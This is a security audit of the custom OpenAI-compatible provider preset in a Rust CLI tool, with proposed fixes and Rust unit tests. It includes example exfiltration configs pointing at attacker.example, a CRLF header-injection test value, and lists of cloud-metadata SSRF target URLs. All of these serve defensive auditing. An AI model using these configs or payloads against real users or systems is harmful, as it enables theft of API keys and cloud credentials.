# Custom Preset Audit

## Summary

- Severity tally: **0 critical / 3 high / 4 medium / 2 low / 1 nit** = **10 findings**, security-skewed (5 are SSRF / credential-exfil / header-injection class).
- Top 3 actionable recommendations:
  1. **Close the `https://`-to-internal-host SSRF hole.** `check_base_url_scheme` (`crates/squeezy-core/src/lib.rs:8564-8590`) only polices `http://`; an `https://` URL pointing at AWS IMDS, GCP metadata, link-local, RFC1918, or loopback addresses is accepted verbatim and the resolved API key ships there in `Authorization: Bearer`. Extend the helper to refuse non-loopback hostnames for `Custom` regardless of scheme.
  2. **Pin DNS at config-build time + reject metadata addresses.** Stock reqwest re-resolves DNS per pooled-connection refresh (`transport.rs:96-110`). A TTL=0 rebind attack steers a validated hostname to `169.254.169.254` at request time. Either pin via `ClientBuilder::resolve` after a validated resolution, or plug a `dyn reqwest::dns::Resolve` that refuses IANA special-use addresses.
  3. **First-class custom-auth-header slot** so users wiring LiteLLM / GitHub Models / corporate proxies that need `x-api-key`, `x-litellm-key`, or `api-key` don't have to smuggle secrets through `[providers.openai_compatible.headers]` (whose values are not redacted by `inspect_redacted`, unlike `api_key` per `lib.rs:1939-1940`).

## Verified

- **Base URL**: user-supplied, no default (`lib.rs:2093`). Verified: **✗** — no scheme/host validation runs for `Custom` beyond the generic HTTP-vs-loopback check at `lib.rs:8547-8548`, which is bypassed by `https://`. Reqwest itself blocks non-`http/https` schemes (`reqwest-0.12.28/src/async_impl/client.rs:2581`) — `file://`, `gopher://`, `ftp://`, `data:` fail downstream, but only after the credential resolver has loaded the secret.
- **Auth**: `Authorization: Bearer <key>` only (`compatible.rs:474`, `.bearer_auth(key)`). Verified: **✗** — no custom-scheme support.
- **Env var**: user-supplied (`lib.rs:2128` returns `""`). Verified: **✓** — `build_openai_compatible_config` (`lib.rs:8608-8622`) requires the user to set `api_key_env` or `api_key`.
- **Default model**: user-supplied (`lib.rs:2154` returns `""`). Verified: **✓**. The CLI startup picker hides `Custom` (`crates/squeezy-cli/src/main.rs:1977-1979`).

## Implementation Overview

`Custom` is the catch-all OpenAI-compatible preset (`lib.rs:1960-1990`) for self-hosted LiteLLM, vLLM, FastChat, internal model gateways, etc. — the documented escape hatch for LiteLLM (CT-3). `from_config` (`compatible.rs:62-98`) trims trailing slashes, resolves the API key via `resolve_api_key_with_inline` (`credentials.rs:45-97`, inline → file → env → fallback-env → `SQUEEZY_CREDENTIALS_JSON`), and constructs a `static_api_key_source`. `stream_response` (`compatible.rs:444-481`) builds `format!("{}/chat/completions", base_url)`, attaches Bearer via `bearer_auth`, iterates `extra_headers` calling `header(key, value)`.

No `Custom`-specific code path exists: it gets "no defaults, full passthrough", which means every defense that *should* exist around an arbitrary host doesn't.

Design rationale (CT-1, CT-2 in shared audit): power users know what they're doing, so validation would be paternalistic. That holds for a single-tenant local CLI with `settings.toml` treated as code (see `lib.rs:9166-9175`'s SECURITY note). It does **not** hold when squeezy is embedded in CI, in a hosted service, or when a malicious settings file is dropped into the project root.

## Findings

### CT-SEC-1 — `https://` to internal hosts is unfiltered (high → critical in hosted env)

`check_base_url_scheme` (`lib.rs:8564-8590`) returns `Ok` for any URL that does not begin with `http://`. The intent is "only police http" since HTTPS is assumed safe in transit — but that conflates *transport secrecy* with *destination trust*. `https://169.254.169.254/...`, `https://metadata.google.internal/...`, `https://[::1]:443`, `https://kubernetes.default.svc:443`, `https://*.internal.consul` all pass cleanly. The Bearer key flows via `bearer_auth(key)` at `compatible.rs:474` unconditionally, so `base_url = "https://attacker.example.com/v1"` exfiltrates whichever env var the user wired (often shared with `OPENAI_API_KEY`).

Shared-audit M-5 covered only the `http://169.254.169.254` form. The `https://` half is unguarded; the existing test at `lib_tests.rs:3570-3604` only proves `http://` enforcement.

**Fix**: `validate_custom_destination(base_url)` that parses with `url::Url`, refuses non-loopback hostnames *for `Custom` specifically*, and rejects IPs in: loopback, link-local (`169.254/16`, `fe80::/10`), private (RFC1918, ULA), broadcast, multicast, unspecified, plus cloud-metadata sentinels (`169.254.169.254`, `metadata.google.internal`, `169.254.170.2` ECS, `fd00:ec2::254`). Wire into `validate_provider_base_urls` (`lib.rs:8539-8558`).

### CT-SEC-2 — DNS rebinding bypasses any string-level allow-list (high)

`shared_client` (`transport.rs:68-110`) builds reqwest with no custom resolver; the default GAI resolver is invoked per host per connection refresh. No application-level pinning. A TTL=0 DNS response that returns `203.0.113.10` at config-load (passing CT-SEC-1's host check) and `169.254.169.254` 5 s later (when the stream fires) steers the request to AWS IMDS after validation. See Vaultwarden GHSA-72vh-x5jq-m82g and activitypub-federation-rust GHSA-q537-8fr5-cw35.

squeezy's only DNS-related defense is `is_loopback_host` (`lib.rs:8592-8599`) which is string-keyed — `localhost.attacker.example` resolves cleanly with rebind.

**Fix**: (a) resolve at config time via `tokio::net::lookup_host`, validate each `IpAddr`, pin via `reqwest::ClientBuilder::resolve(host, addr)`. (b) Plug a `dyn reqwest::dns::Resolve` into `build_client` that refuses special-use addresses. Option (b) is more robust (covers pool eviction) and matches `agent-fetch`'s approach. For `Custom` only, a per-preset client variant.

### CT-SEC-3 — Header injection blocked, but only at send-time and silently (medium)

`provider_setting_headers` (`lib.rs:8505-8510`) returns `BTreeMap<String, String>` from TOML with no `\r\n` sanitization at parse time (`lib.rs:2857-2879`). Values pass through `resolve_shell_escape` (`lib.rs:9176-9237`) which trims a single trailing `\n` but does not strip embedded `\r\n`. They reach `RequestBuilder::header(key, value)` at `compatible.rs:475-477`. Reqwest defers to `http::HeaderValue::try_from` (`reqwest-0.12.28/src/async_impl/request.rs:194-234`); `http::HeaderValue` rejects bytes outside `[0x20..0x7E] ∪ {0x09}` (`http-1.4.0/src/header/value.rs:552-559`), so `\r` (0x0D) and `\n` (0x0A) cannot smuggle a body. **Request smuggling itself is blocked.**

But the failure mode is silent: reqwest captures the `http::Error` into `self.request` and surfaces it at `.send()` (`reqwest/src/async_impl/request.rs:212-233`); our `send_with_retry` (`retry.rs:108-164`) wraps it in `SqueezyError::ProviderRequest(error.to_string())`, surfacing as "builder error: invalid HTTP header value" with no field name. Codex sanitizes upfront via `HeaderName::try_from` + `HeaderValue::try_from` at config-load (`others/codex/codex-rs/model-provider-info/src/lib.rs:209-234`); we don't.

**Fix**: validate header keys+values in `ProviderSettings::from_table` (`lib.rs:2857-2879`) via `HeaderName::from_bytes` + `HeaderValue::from_str`, reject at config-load with a TOML field path.

### CT-SEC-4 — Non-Bearer-auth workaround leaks secrets through `inspect_redacted` (medium)

CT-2 noted `Custom` cannot use a non-Bearer scheme. The discoverable workaround (from LiteLLM `x-litellm-key`, vLLM Bearer, PortKey `x-portkey-api-key` doc trees) is to set `api_key_env = ""` and inject `[providers.openai_compatible.headers] x-api-key = "sk-..."`. **But `ProviderSettings::headers` (`lib.rs:2809`) carries no `#[serde(serialize_with = "redact_secret_opt")]` guard** — unlike `api_key` (`lib.rs:1939-1940`, `2795-2796`). Anything in the headers table is serialized verbatim by `inspect_redacted` (`lib.rs:1068-1080`).

A user who follows the workaround leaks their secret to any code path that calls `inspect_redacted` (panic handler, `--diagnostics`, bug-report email). CT-2 framed this as "friction"; the impact is *the workaround for the missing feature is itself a secret-leak channel*.

**Fix**: add `OpenAiCompatibleConfig::auth_header_name: Option<String>` + `auth_header_value_env: Option<String>` (or extend `api_key_env` with an `api_key_scheme: bearer | header | none`). opencode models this cleanly in `route/auth.ts:47-48`: `bearer` produces `{ authorization: 'Bearer ${secret}' }`, `header(name)` produces `{ [name]: secret }`.

### CT-SEC-5 — No operator-mode allow-list / first-use confirmation (medium)

A `Custom` preset with arbitrary `base_url` + a real `OPENAI_API_KEY` env is a one-line credential-exfil primitive against any user who imports an untrusted project-local `squeezy.toml`. No `SQUEEZY_ALLOWED_CUSTOM_HOSTS` allow-list, no first-run confirmation, no diff display when `[providers.openai_compatible]` appears in a non-user scope. Project-local settings merge transparently with user-scope; the only existing guard is `delete_api_key`'s refusal to *write* secrets to `SettingsScopeKind::Project` (`credentials.rs:108-113`) — a write refusal, not a read refusal.

Threat shape: attacker lands `./squeezy.toml` with `model.provider = "openai_compatible"` + `base_url = "https://attacker/v1"` + `api_key_env = "OPENAI_API_KEY"`; on next `squeezy run` the user's key flows to attacker via Bearer.

**Fix**: prompt-on-first-use for `Custom`'s resolved `base_url`, persist confirmation in user-scope settings, refuse to load a project-scope `Custom` whose host is unconfirmed. Startup-warn when the resolved `Custom` base_url is loaded from `config_source != User`.

### CT-FN-1 — Empty `api_key_env` + header-auth produces a silent empty-Bearer override (high)

If user sets `api_key_env = ""` (TOML empty string, not omitted), `provider_setting` returns `Some("")`, the `.or_else` fallback never runs, and `resolve_api_key_with_inline(_, "")` fails at `env::var("")` — with a misleading `missing  or ` error (`credentials.rs:92-96` template-interpolates an empty `env_var`).

Worse, if `api_key_env = ""` AND `[providers.openai_compatible.headers] Authorization = "Bearer ..."` is set (CT-SEC-4 workaround for native Bearer auth on a non-standard env), the user's header is silently overridden by `bearer_auth("")` at `compatible.rs:474` — emitting `Authorization: Bearer ` with empty token, clobbering the user's auth.

**Fix**: short-circuit `bearer_auth` in `from_config` (`compatible.rs:62-98`) when resolved key is empty AND `extra_headers` carries an `Authorization` (case-insensitive) entry. Document the "omit `api_key_env` entirely for header-based auth" path in `lib.rs:1960-1962`.

### CT-FN-2 — No model-id discovery / capability catalog (medium)

`Custom` has no `models.json` entries, no `MODEL_REGISTRY` rows, no curated capability flags. The cross-flavor table at `compatible.rs:374-403` keys on namespaces (`anthropic/`, `openai/`, `google/`); a `Custom`-routed `mycorp-llm-7b` falls through to `Generic` and loses Anthropic cache markers, vision capability, reasoning-effort routing. Shared-audit M-6 / M-11 already flag this for other presets; `Custom` is worst-case because there's no preset-name lookup either.

**Fix**: extend `OpenAiCompatibleConfig` with optional `model_metadata: BTreeMap<ModelId, ModelCapabilities>` so power users hand-curate in TOML (`vision = true`, `supports_anthropic_caching = true`, `context_window = 200000`). Defaults stay conservative.

### CT-OP-1 — `inspect_redacted` leaks the full `base_url` (low)

`base_url = "https://internal.megacorp.example/v1?customer=acme-corp-prod"` leaks through `inspect_redacted` since `OpenAiCompatibleConfig::base_url: String` is not redacted (`lib.rs:1941`). For multi-tenant proxies that encode customer identity in path/query, this is a tenancy disclosure. The `api_key` field next door *is* redacted.

**Fix**: host-only redaction in `inspect_redacted` for `base_url`, or document the convention that callers keep secrets out of path/query.

### CT-OP-2 — `extra_headers` BTreeMap allows case-insensitive duplicates (low)

Shared-audit M-1 documented this for all presets; `Custom` is worst-affected because users *do* type custom header names by hand and capitalization varies (`X-Api-Key` vs `x-api-key`). Both keys round-trip into the wire, duplicated headers reach the proxy.

**Fix**: normalize header-key case at parse time (same fix as M-1).

### CT-N1 — `display_name` is verbose (nit)

"OpenAI-compatible (custom)" is the only parenthetical in the preset table (`lib.rs:2022-2042`). "Custom OpenAI-compatible" reads cleaner in picker columns.

## Catalog

`Custom` ships with no curated model catalog by definition. `models.json` has zero entries keyed on `openai_compatible`; `is_full_tier` (`lib.rs:2048-2059`) correctly returns `false`. There is no mechanism for a user to *supply* a model catalog for their custom endpoint without forking the binary — capability lookups (`registry.rs:256-258`) fall through to `Generic`.

Deliberate trade-off: forcing users to declare a model id (`lib.rs:2154` returns `""` so `model = "..."` is mandatory) means squeezy can't claim a misleading default. The downside is that vision, Anthropic cache markers, reasoning-effort routing, and preset-driven body extensions cannot activate for `Custom`-routed models. See CT-FN-2.

## Test Coverage Gaps

- **No SSRF unit tests for `Custom`.** `lib_tests.rs:3570-3604` covers `http://` only for `openai`/`ollama`; nothing exercises `https://169.254.169.254/v1`, `https://[::1]:443/v1`, `https://metadata.google.internal/`, `https://0.0.0.0/v1` against the `Custom` arm.
- **No DNS-rebinding test.** Mock a `Resolve` impl that returns benign-then-malicious addresses across two `current_key` invocations; assert the second resolution is refused.
- **No header-injection sanitization test.** Setting `headers.x-evil = "value\r\nHost: attacker.example"` should fail at config-load with a TOML path, not as a deferred reqwest builder error.
- **No `api_key_env = ""` + header-Bearer test** (CT-FN-1).
- **No "header value is redacted when key looks secret-shaped" test** (`x-api-key`, `api-key`, `authorization`, `x-litellm-key`).
- **No `Custom`-preset costly/mock test.** `crates/squeezy-llm/tests/` has zero coverage; closest analog is `lmstudio_mock.rs` (tests `LMStudioProvider`, not the preset).
- **No project-scope hijack test.** A `[providers.openai_compatible]` block appearing only in `./squeezy.toml` (not user-scope) should be refused or warn at startup.

## Verification Strategy

Adversarial unit tests in `crates/squeezy-core/src/lib_tests.rs`:

```rust
#[test]
fn custom_preset_rejects_internal_https_destinations() {
    for url in [
        "https://169.254.169.254/latest/api/token",
        "https://metadata.google.internal/computeMetadata/v1/",
        "https://[fd00:ec2::254]/latest/",
        "https://169.254.170.2/v2/credentials/",
        "https://[::1]:443/v1",
        "https://localhost.attacker.example/v1",
    ] {
        let settings = SettingsFile::from_toml_str(&format!(r#"
[model]
provider = "openai_compatible"
[providers.openai_compatible]
base_url = "{url}"
api_key_env = "FAKE_KEY"
"#), "t").unwrap();
        AppConfig::try_from_settings_and_env_vars(settings, None, |_| Some("k".into()))
            .expect_err(&format!("must reject {url}"));
    }
}

#[test]
fn custom_preset_rejects_crlf_header_at_load_time() {
    let settings = SettingsFile::from_toml_str(r#"
[model]
provider = "openai_compatible"
[providers.openai_compatible]
base_url = "https://api.example.com/v1"
api_key_env = "FAKE_KEY"
[providers.openai_compatible.headers]
"x-evil" = "value\r\nHost: attacker.example"
"#, "t").unwrap();
    let err = AppConfig::try_from_settings_and_env_vars(settings, None, |_| Some("k".into()))
        .expect_err("CRLF must be rejected");
    assert!(err.to_string().contains("openai_compatible.headers.x-evil"));
}
```

Mock-server harness in `crates/squeezy-llm/tests/` (extend `lmstudio_mock.rs:25-63`'s `spawn_chat_server`): asserts Bearer flows when `api_key_env` resolves, custom header is forwarded verbatim, secret-shaped header values are masked on round-trip.

DNS-rebinding fuzz: build a `dyn reqwest::dns::Resolve` that returns benign-then-malicious addresses; wire into `transport::build_client`; assert the second `stream_response` errors before connect.

LiteLLM smoke: spin `ghcr.io/berriai/litellm:main-latest` with `master_key: sk-test`; assert `Custom` talks to it with Bearer-via-`api_key_env` AND header-via-`extra_headers` (covering CT-SEC-4's missing-feature path).

## References

- Shared audit (M-5, CT-1..CT-3): `/Users/abbassabra/esqueezy/squeezy/.audit/providers/openai-compatible.md` §M-5, §Per-Preset/Custom.
- LiteLLM virtual-keys (`Authorization: Bearer` + `X-Litellm-Key`): https://docs.litellm.ai/docs/proxy/virtual_keys
- LiteLLM custom auth (non-Bearer schemes): https://docs.litellm.ai/docs/proxy/custom_auth
- vLLM OpenAI-compat auth: https://docs.vllm.ai/en/stable/serving/openai_compatible_server/
- vLLM security guidance: https://docs.vllm.ai/en/stable/usage/security/
- reqwest custom DNS resolver trait: https://docs.rs/reqwest/latest/reqwest/dns/index.html
- agent-fetch (SSRF-protecting HTTP client for AI agents): https://github.com/Parassharmaa/agent-fetch
- Vaultwarden DNS-rebind SSRF (GHSA-72vh-x5jq-m82g): https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-72vh-x5jq-m82g
- activitypub-federation-rust SSRF via 0.0.0.0 (GHSA-q537-8fr5-cw35): https://github.com/LemmyNet/lemmy/security/advisories/GHSA-q537-8fr5-cw35
- opencode `openai-compatible.ts` (no URL validation): `/Users/abbassabra/esqueezy/others/opencode/packages/llm/src/providers/openai-compatible.ts:22-36`
- opencode `dialog-custom-provider-form.ts` (regex-only `/^https?:\/\//`, no IP allow-list): `/Users/abbassabra/esqueezy/others/opencode/packages/app/src/components/dialog-custom-provider-form.ts:51-71`
- opencode `auth.ts` (`bearer` vs `header` vs `bearerHeader` split): `/Users/abbassabra/esqueezy/others/opencode/packages/llm/src/route/auth.ts:112-130`
- codex `model_provider_info.rs::build_header_map` (sanitizes headers at config-load): `/Users/abbassabra/esqueezy/others/codex/codex-rs/model-provider-info/src/lib.rs:209-234`
- reqwest scheme check (rejects non-`http/https` at `execute_request`): `~/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.12.28/src/async_impl/client.rs:2581-2588`
- http crate header-value validation (rejects `\r`/`\n` via `is_visible_ascii`): `~/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/http-1.4.0/src/header/value.rs:552-559`
